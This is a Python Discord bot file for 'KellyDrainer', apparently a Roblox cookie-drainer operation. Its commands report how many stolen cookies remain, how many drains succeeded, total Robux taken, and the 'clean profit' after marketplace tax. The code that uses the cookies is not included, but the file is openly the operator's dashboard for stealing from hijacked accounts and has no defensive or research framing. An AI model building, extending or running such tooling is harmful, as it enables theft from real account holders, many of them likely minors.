from discord.ext import commands
import src.utils as utils
import time, discord
from datetime import datetime

def start_bot(token):
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix='$', intents=intents)

    @bot.event
    async def on_ready():
        utils.log("[BOT]", f"Logged in as {bot.user}", utils.BLUE)

    @bot.command()
    async def stats(ctx):
        uptime_seconds = int(time.time() - utils._start_time)
        m, s = divmod(uptime_seconds, 60)
        h, m = divmod(m, 60)

        embed = discord.Embed(
            title="📊 Drainer Stats",
            color=0xFFFFFF,
            timestamp=datetime.utcnow()
        )
        embed.add_field(name="🍪 Cookies Left", value=f"`{utils._total_cookies}`", inline=True)
        embed.add_field(name="✅ Successes", value=f"`{utils._total_tries}`", inline=True)
        embed.add_field(name="💸 Total Drained", value=f"**{utils._total_robux} R$**", inline=False)
        embed.add_field(name="⏳ Uptime", value=f"`{h}h {m}m {s}s`", inline=True)
        embed.set_footer(text="KellyDrainer")
        
        await ctx.send(embed=embed)

    @bot.command()
    async def tax(ctx):
        gross = utils._total_robux
        clean = int(gross * 0.7)
        tax_taken = gross - clean

        embed = discord.Embed(
            title="💰 Tax Calculation",
            color=0xFFFFFF,
            timestamp=datetime.utcnow()
        )
        embed.add_field(name="📈 Total Drained", value=f"`{gross} R$`", inline=True)
        embed.add_field(name="📉 Tax Deducted", value=f"`{tax_taken} R$`", inline=True)
        embed.add_field(name="💸 Clean Profit", value=f"`{clean} R$`", inline=False)
        embed.set_footer(text="KellyDrainer")
        
        await ctx.send(embed=embed)

    bot.run(token)